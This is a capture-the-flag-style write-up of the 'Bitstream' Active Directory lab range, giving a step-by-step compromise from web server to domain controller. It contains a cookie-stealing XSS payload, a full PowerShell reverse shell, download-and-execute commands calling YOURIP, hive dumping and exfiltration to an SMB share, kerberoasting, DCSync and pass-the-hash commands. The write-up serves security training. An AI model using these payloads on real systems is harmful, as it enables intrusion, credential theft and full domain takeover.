---
title: Bitstream - Full Guide and Writeup
slug: bitstream_writeup
category: _writeups
share: true
date: 2026-07-08
description: This is a writeup of the Bitstream range.
tags:
  - Challenge
  - AD
  - webapp
  - attack
  - idor
  - kerberoasting
  - kerberoast
---
Condensed Summary with step-by-step at the very end!  
  
Welcome to bitstream, this is the network topology given to us, showing the range environment:  
  
![614](../assets/uploads/Bit%20Stream%20-%20FINAL-1783405030059.webp)  
  
We are also given the following info at the start:  
  
---  
  
BitStream is a cloud storage provider that hosts sensitive data for enterprise clients. They have segmented their internal Active Directory environment (bitstream.hsm) and requested a full penetration test of their environment.  
  
You have been provided with VPN access to their Active Directory environment.  
  
**To make this lab a bit easier, Defender is only enabled on the Domain Controller.**  
  
---  
  
Jumping right into initial recon and enumeration, the lab's questions start with the webserver `10.0.0.5` or `web.bitstream.hsm`.  
  
Initial scan shows that port 22 and port 80 are open. Having no creds yet, we look toward port 80. ![Bit Stream - FINAL-1783405572264](../assets/uploads/Bit%20Stream%20-%20FINAL-1783405572264.webp)  
  
While manually enumerating the website with Burp Suite open, we can only really see two most probable areas for paths, being login and quote, since they accept input. ![309](../assets/uploads/Bit%20Stream%20-%20FINAL-1783406517748.webp)  
  
After poking around at login and looking for common areas to hide creds and web directories like /robots.txt, I found nothing, so I decided to run a directory fuzz with the command here:  
  
```bash  
feroxbuster -u http://10.0.0.5 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,json,txt,bak  
```  
  
We get this result showing nothing really interesting other than the /portal page that redirects us. ![Bit Stream - FINAL-1783406618948](../assets/uploads/Bit%20Stream%20-%20FINAL-1783406618948.webp)  
  
Seeing as I had no creds, and no way to get them, I turned my head to the other input-accepting endpoint: `/quote`  
  
After further enumeration, I found that you could upload a message via `POST /quote`, and the server would actually appear to save it, giving a telling message alongside it.  
  
![531](../assets/uploads/Bit%20Stream%20-%20FINAL-1783406843393.webp)  
  
This gave me the idea to try and achieve cookie theft via stored XSS.  
  
First, I ran a Python web server to catch the cookie:  
  
```bash  
python3 -m http.server 8000  
```  
  
With the server running, we can use a simple payload submitted to the `/quote` message field, which will steal and send back the cookie of the admin user who views the stored page:  
  
```html  
<script>new Image().src='http://YOURIP:8000/c?'+document.cookie</script>  
```  
  
![Bit Stream - FINAL-1783462429565](../assets/uploads/Bit%20Stream%20-%20FINAL-1783462429565.webp)  
  
After a short wait, the cookie lands in our listener output.  
  
![Bit Stream - FINAL-1783462515492](../assets/uploads/Bit%20Stream%20-%20FINAL-1783462515492.webp)  
  
By using Burp Suite, we can see the cookie name for the website is **session_id**.  
  
Then we can right-click, inspect, and browse to Application, then under Storage find Cookies, and add a cookie manually like below: ![Bit Stream - FINAL-1783462660758](../assets/uploads/Bit%20Stream%20-%20FINAL-1783462660758.webp)  
  
Upon refresh, we get our session as joey! ![565](../assets/uploads/Bit%20Stream%20-%20FINAL-1783462760579.webp)  
  
Continuing with enumeration, the only button that leads somewhere promising is internal messaging.  
  
Inside messaging, we can view our inbox; clicking on a message shows a URL with an ID number per message. If this parameter is vulnerable to IDOR, then changing the number should show different messages:  
  
```  
http://web.bitstream.hsm/portal/messages/3  
```  
  
A quick check confirms that it is! One of the messages that was not visible initially can be viewed by switching the ID to 27 in the URL, getting us the creds of the SQL machine.  
  
```  
http://web.bitstream.hsm/portal/messages/27  
```  
  
![561](../assets/uploads/Bit%20Stream%20-%20FINAL-1783463415047.webp)  
  
Now, per the range questions, we are hinted to move toward the SQL machine.  
  
Using our newly acquired creds, we can use `impacket-mssqlclient` to get a stable remote connection.  
  
![Bit Stream - FINAL-1783464252317](../assets/uploads/Bit%20Stream%20-%20FINAL-1783464252317.webp)  
  
Then we can use the command `enable_xp_cmdshell` to allow direct command execution. `xp_cmdshell` is also the answer to the first question in part 2.  
  
From here, there are a lot of different ways to get more stable remote access onto this machine. I chose to host a `shell.ps1` reverse shell on my Kali machine and have the SQL session download and execute it in memory.  
  
The shell.ps1 file contains a standard PowerShell TCP reverse shell. Save the following as `shell.ps1` on your Kali machine, replacing `YOURIP` and `YOURPORT`:  
  
```powershell  
$client = New-Object Net.Sockets.TCPClient("YOURIP",YOURPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  
```  
  
Start a listener on Kali and a Python server to serve the file, then execute from the SQL session:  
  
```bash  
# Kali — terminal 1  
rlwrap nc -lvnp 4444  
  
# Kali — terminal 2  
python3 -m http.server 9090  
```  
  
```sql  
xp_cmdshell powershell "IEX(New-Object Net.WebClient).DownloadString(''http://YOURIP:9090/shell.ps1'')"  
```  
  
Hosted rev shell ![Bit Stream - FINAL-1783464790531](../assets/uploads/Bit%20Stream%20-%20FINAL-1783464790531.webp)  
  
Command ran on SQL and call back ![Bit Stream - FINAL-1783464870254](../assets/uploads/Bit%20Stream%20-%20FINAL-1783464870254.webp)  
  
Callback showing our shell and viewing our privileges  
  
![Bit Stream - FINAL-1783464908006](../assets/uploads/Bit%20Stream%20-%20FINAL-1783464908006.webp)  
  
Immediately something stands out in our privileges: `SeImpersonatePrivilege - Impersonate a client after authentication - Enabled`  
  
Upon looking up how to exploit this privilege, we find a couple of ways, but I chose to use GodPotato: **GodPotato** coerces the SYSTEM account into authenticating to a fake COM endpoint, captures the token, and impersonates it. Because service accounts are granted `SeImpersonatePrivilege` by design (Windows needs them to impersonate callers for access control), this privilege is almost always present on SQL Server and IIS service accounts  making it a reliable escalation path.  
  
First, download GodPotato to your Kali machine and serve it alongside shell.ps1:  
  
```bash  
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O /tmp/GodPotato-NET4.exe  
```  
  
Then download it to the target from your reverse shell:  
  
```powershell  
(New-Object Net.WebClient).DownloadFile('http://YOURIP:9090/GodPotato-NET4.exe','C:\Users\Public\Documents\gp.exe')  
```  
  
Once we upload the exe and run it, we can see it says we are running as NT AUTHORITY! ![Bit Stream - FINAL-1783465539547](../assets/uploads/Bit%20Stream%20-%20FINAL-1783465539547.webp)  
  
First thing I will do is set up persistence to make it easier to remote in later.  
  
Dump all info from this PC's SAM, SYSTEM, and SECURITY hives using GodPotato to run each command as SYSTEM (required to read the protected hives):  
  
```powershell  
C:\Users\Public\Documents\gp.exe -cmd "reg save HKLM\SAM C:\Users\Public\Documents\sam.hive"  
C:\Users\Public\Documents\gp.exe -cmd "reg save HKLM\SYSTEM C:\Users\Public\Documents\sys.hive"  
C:\Users\Public\Documents\gp.exe -cmd "reg save HKLM\SECURITY C:\Users\Public\Documents\sec.hive"  
```  
  
Start the SMB receiver on Kali, then copy the hive files across from the target:  
  
```bash  
# Kali  
sudo impacket-smbserver share /home/kali/hacksmarter/bitstream/loot/ -smb2support -username kali -password kali  
```  
  
```powershell  
# Target — authenticate to the share then copy each file  
net use \\YOURIP\share /user:kali kali  
cmd /c copy C:\Users\Public\Documents\sam.hive \\YOURIP\share\  
cmd /c copy C:\Users\Public\Documents\sys.hive \\YOURIP\share\  
cmd /c copy C:\Users\Public\Documents\sec.hive \\YOURIP\share\  
```  
  
![Bit Stream - FINAL-1783466775268](../assets/uploads/Bit%20Stream%20-%20FINAL-1783466775268.webp)  
  
Now we can parse the hives offline with secretsdump:  
  
```bash  
impacket-secretsdump -sam loot/sam.hive -system loot/sys.hive -security loot/sec.hive LOCAL  
```  
  
![Bit Stream - FINAL-1783466909552](../assets/uploads/Bit%20Stream%20-%20FINAL-1783466909552.webp)  
  
Finally, we achieve our persistence as admin on the SQL box using the recovered local Administrator hash:  
  
```bash  
evil-winrm -i 10.0.1.7 -u Administrator -H <NT_HASH_FROM_SECRETSDUMP>  
```  
  
![Bit Stream - FINAL-1783466960352](../assets/uploads/Bit%20Stream%20-%20FINAL-1783466960352.webp)  
  
Because of the dump, we also get bob's cached domain credential hash.  
  
![Bit Stream - FINAL-1783472228946](../assets/uploads/Bit%20Stream%20-%20FINAL-1783472228946.webp)  
  
Cracking the DCC2 hash gives us `pokemon`:  
  
```bash  
hashcat -m 2100 '$DCC2$10240#bob#HASH' /usr/share/wordlists/rockyou.txt  
```  
  
Next, we get two paths: we can either use BloodHound now to answer the first question for the workstation/part 3, or we can use another impacket command to automatically search for kerberoastable users with our new AD creds.  
  
Before we can do any of this, we need a way to tunnel to the DC subnet (`10.0.2.0/24`), which is not directly reachable from our VPN.  
  
Although there are many ways to do this, I chose to use Ligolo-ng, a relatively new tool for tunneling made easy.  
  
First, I got the agent for the tunnel onto the SQL box, then ran it in the background so it survives session disconnects:  
  
```powershell  
Start-Process -FilePath "C:\Users\Public\Documents\agent.exe" -ArgumentList "-connect YOURIP:11601 -ignore-cert" -WindowStyle Hidden  
```  
  
![Bit Stream - FINAL-1783472987024](../assets/uploads/Bit%20Stream%20-%20FINAL-1783472987024.webp)  
  
Seeing our initiated connection back! ![Bit Stream - FINAL-1783473009748](../assets/uploads/Bit%20Stream%20-%20FINAL-1783473009748.webp)  
  
Then type `session`, select session 1, and type `start`.  
  
Then, lastly, add the route for the DC subnet only  **do not add `10.0.1.0/24`** as this will break the agent connection since the agent itself is on that subnet:  
  
```bash  
sudo ip route add 10.0.2.0/24 dev ligolo  
```  
  
![Bit Stream - FINAL-1783473173144](../assets/uploads/Bit%20Stream%20-%20FINAL-1783473173144.webp)  
  
Above, we can see we are able to ping the DC directly from our Kali machine!  
  
Now, back to enumerating the domain first method with `impacket-GetUserSPNs`, using bob's cracked password:  
  
```bash  
impacket-GetUserSPNs bitstream.hsm/bob:'pokemon' -dc-ip 10.0.2.5 -request -outputfile /tmp/spns.txt  
```  
  
![Bit Stream - FINAL-1783473342972](../assets/uploads/Bit%20Stream%20-%20FINAL-1783473342972.webp)  
  
We immediately get our answer to the first question, which is `eddie`. Cracking the TGS hash gives us the password:  
  
```bash  
hashcat -m 13100 /tmp/spns.txt /usr/share/wordlists/rockyou.txt  
```  
  
![Bit Stream - FINAL-1783473492074](../assets/uploads/Bit%20Stream%20-%20FINAL-1783473492074.webp)  
  
Second way to learn the kerberoastable user, and a better long-term option since we will use it again later  BloodHound.  
  
Again, there are many ways to collect the loot for BloodHound, but I chose `SharpHound.exe` since I have easy access to upload files. I won't fully explain BloodHound here, but it's worth looking up and learning if it's new to you.  
  
Once in BloodHound, you can use Cypher queries to check kerberoastable users:  
  
![595](../assets/uploads/Bit%20Stream%20-%20FINAL-1783474212900.webp)  
  
Back to the attack chain, we have the password for eddie, and since the range hints at us working toward the workstation box, we need to enumerate it.  
  
Simple Nmap scans point toward nothing being open except for RDP and WinRM. ![Bit Stream - FINAL-1783474595892](../assets/uploads/Bit%20Stream%20-%20FINAL-1783474595892.webp)  
  
Since eddie is not in the Remote Management Users group and is denied WinRM, we pivot toward RDP:  
  
```bash  
xfreerdp /u:eddie /p:'superman' /d:bitstream.hsm /v:10.0.1.6 /cert:ignore  
```  
  
![301](../assets/uploads/Bit%20Stream%20-%20FINAL-1783474778072.webp)  
  
This part of the lab could be a little tricky; the only info we know is that we want to get the password for `Luisa`.  
  
Enumeration of the box for anything that could be a backup file or script leads to no findings.  
  
Our user also has no files anywhere except for a few shortcuts on his desktop.  
  
The only thing **vaguely** intriguing is the Microsoft Edge shortcut  its `Last Modified` timestamp is noticeably more recent than the other desktop icons, suggesting it has been used or changed recently.  
  
![Bit Stream - FINAL-1783475100795](../assets/uploads/Bit%20Stream%20-%20FINAL-1783475100795.webp)  
  
Opening it shows restore pages.   
![Bit Stream - FINAL-1783547533846](../assets/uploads/Bit%20Stream%20-%20FINAL-1783547533846.webp)  
  
Upon clicking it, you get prompted to view a saved password. After entering eddie's password to confirm identity, the saved credential for Luisa is revealed:  
  
![Bit Stream - FINAL-1783475470779](../assets/uploads/Bit%20Stream%20-%20FINAL-1783475470779.webp)  
  
Now completing the answer for part 3: `Luisa:Lulu_Des1gn!!`  
  
Moving toward the share machine, our first question is: What permission does Luisa have over James in the Active Directory environment?   
  
Taking a look at BloodHound, we can search for our new pwned user and view their outbound control. ![Bit Stream - FINAL-1783475733357](../assets/uploads/Bit%20Stream%20-%20FINAL-1783475733357.webp)  
  
So our answer is `GenericAll`.  
  
But what does this do for us?  
  
`GenericAll` is the highest level of AD object control  it means Luisa has full control over the james account, including the ability to reset his password without knowing the current one.  
  
Reading along in BloodHound, we can see one extremely useful technique under Linux abuse:  
  
![Bit Stream - FINAL-1783475893380](../assets/uploads/Bit%20Stream%20-%20FINAL-1783475893380.webp)  
  
```bash  
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"  
```  
  
So my working command would be:  
  
```bash  
net rpc password "james" "P@ssw0rd" -U "bitstream.hsm"/"Luisa"%'Lulu_Des1gn!!' -S "10.0.2.5"  
```  
  
> **Note:** The `!!` characters in Luisa's password trigger bash history expansion. Wrapping the password in single quotes prevents this.  
  
No errors on run, and we can confirm the login works. ![Bit Stream - FINAL-1783476107840](../assets/uploads/Bit%20Stream%20-%20FINAL-1783476107840.webp)  
  
Pwned another account!  
  
But we still haven't answered the next question, which is `What is the password for svc_backup?`  
  
I haven't even seen this password yet, but since the area we are working under is the **share** machine, we know to check james's creds against it.  
  
First, enumerate the share box: ![Bit Stream - FINAL-1783476351639](../assets/uploads/Bit%20Stream%20-%20FINAL-1783476351639.webp)  
  
Since it is called the "share" machine, I decided to check out SMB first.  
  
Log on to SMB with our newly changed password:  
  
```bash  
impacket-smbclient 'bitstream.hsm/james:P@ssw0rd@10.0.1.5'  
```  
  
Once in, we see: ![Bit Stream - FINAL-1783485761431](../assets/uploads/Bit%20Stream%20-%20FINAL-1783485761431.webp)  
  
Under Scripts, which is the only non-standard share here, we see the following scripts:  
  
![Bit Stream - FINAL-1783485797471](../assets/uploads/Bit%20Stream%20-%20FINAL-1783485797471.webp)  
  
Downloading and looking at the `Automated-AD-Backup.ps1` script gives us our creds!  
  
```  
get Automated-AD-Backup.ps1  
```  
  
![Bit Stream - FINAL-1783486027569](../assets/uploads/Bit%20Stream%20-%20FINAL-1783486027569.webp)  
  
This answers our question for this part: `svc_backup:P@ssw0rd2025!`  
  
With this, we can take a look back at BloodHound to check updated attack routes.  
  
In BloodHound, we can see that `svc_backup` has DCSync rights over the Domain Controller  meaning we can request a replication of all domain hashes directly from the DC without needing to touch LSASS or drop any tools on the DC itself.  
  
![Bit Stream - FINAL-1783486287290](../assets/uploads/Bit%20Stream%20-%20FINAL-1783486287290.webp)  
  
We dump the hashes using secretsdump with svc_backup's credentials:  
  
```bash  
impacket-secretsdump 'bitstream.hsm/svc_backup:P@ssw0rd2025!@10.0.2.5'  
```  
  
![Bit Stream - FINAL-1783486754536](../assets/uploads/Bit%20Stream%20-%20FINAL-1783486754536.webp)  
  
Then it's as simple as passing the domain Administrator hash to Evil-WinRM and remoting into the DC:  
  
```bash  
evil-winrm -i 10.0.2.5 -u Administrator -H <DOMAIN_ADMIN_NT_HASH>  
```  
  
![Bit Stream - FINAL-1783486962252](../assets/uploads/Bit%20Stream%20-%20FINAL-1783486962252.webp)  
  
Then grab our flag:  
  
![Bit Stream - FINAL-1783486943740](../assets/uploads/Bit%20Stream%20-%20FINAL-1783486943740.webp)  
  
---  
  
## Condensed Summary  Exact Steps  
  
1. Scan the webserver `web.bitstream.hsm` (10.0.0.5) and find ports 22 and 80 open.  
2. Enumerate the website with Burp Suite and identify `login` and `/quote` as the only input-accepting endpoints.  
3. Run `feroxbuster` for directory discovery, which only turns up a `/portal` page that redirects.  
4. Submit a message via `POST /quote` and confirm the server stores it.  
5. Host a Python listener (`python3 -m http.server 8000`) and submit a stored XSS payload (`<script>new Image().src='http://YOURIP:8000/c?'+document.cookie</script>`) to steal the viewing user's cookie.  
6. Catch the `session_id` cookie, add it manually in the browser under Application → Storage → Cookies, and refresh to log in as `joey`.  
7. In internal messaging, exploit IDOR by changing the message ID in `/portal/messages/3` to `/portal/messages/27`, revealing the SQL machine's creds.  
8. Connect to the SQL box (10.0.1.7) with `impacket-mssqlclient` using the recovered creds.  
9. Run `enable_xp_cmdshell` to gain direct command execution.  
10. Host a `shell.ps1` reverse shell on Kali, start a listener, then execute via `xp_cmdshell powershell "IEX(New-Object Net.WebClient).DownloadString(''http://YOURIP:9090/shell.ps1'')"` to get a stable shell.  
11. Spot `SeImpersonatePrivilege` in your privileges. Download GodPotato to the target via `DownloadFile`, then run it to escalate to `NT AUTHORITY\SYSTEM`.  
12. Dump the SAM, SYSTEM, and SECURITY hives with `reg save` via GodPotato. Start `impacket-smbserver` on Kali with credentials, authenticate with `net use`, then copy the hive files across.  
13. Parse hives with `impacket-secretsdump LOCAL` to recover the local Administrator hash (persistence via Evil-WinRM) and bob's DCC2 hash — crack with `hashcat -m 2100` to get `pokemon`.  
14. Stand up a **Ligolo-ng** tunnel through the SQL box. Add only `10.0.2.0/24 dev ligolo` — never add the `10.0.1.0/24` subnet or it kills the agent.  
15. Kerberoast with `impacket-GetUserSPNs` as `bob`, then crack the TGS hash with `hashcat -m 13100` to get `eddie:superman`. BloodHound/SharpHound confirms the same kerberoastable user.  
16. Nmap the workstation (10.0.1.6), find only RDP and WinRM open. Since eddie is not in Remote Management Users, connect via RDP with `xfreerdp /u:eddie /p:'superman' /d:bitstream.hsm /v:10.0.1.6 /cert:ignore`.  
17. Notice the Microsoft Edge shortcut has a more recent `Last Modified` timestamp than other desktop items. Open it, view the restore pages, and reveal the saved password using eddie's password to confirm identity — recovers `Luisa:Lulu_Des1gn!!`.  
18. In BloodHound, confirm Luisa has `GenericAll` over `james` (full object control including password reset).  
19. Abuse that with `net rpc password` to reset james's password — use single quotes around Luisa's password to prevent bash `!!` history expansion.  
20. Log into the share box (10.0.1.5) over SMB as `james` with `impacket-smbclient`.  
21. In the `Scripts` share, download `Automated-AD-Backup.ps1` to recover `svc_backup:P@ssw0rd2025!`.  
22. In BloodHound, confirm `svc_backup` has DCSync rights over the Domain Controller.  
23. Dump all domain hashes via DCSync using `impacket-secretsdump` with svc_backup's credentials.  
24. Pass the domain Administrator NT hash to `evil-winrm` to remote into the DC and grab the final flag.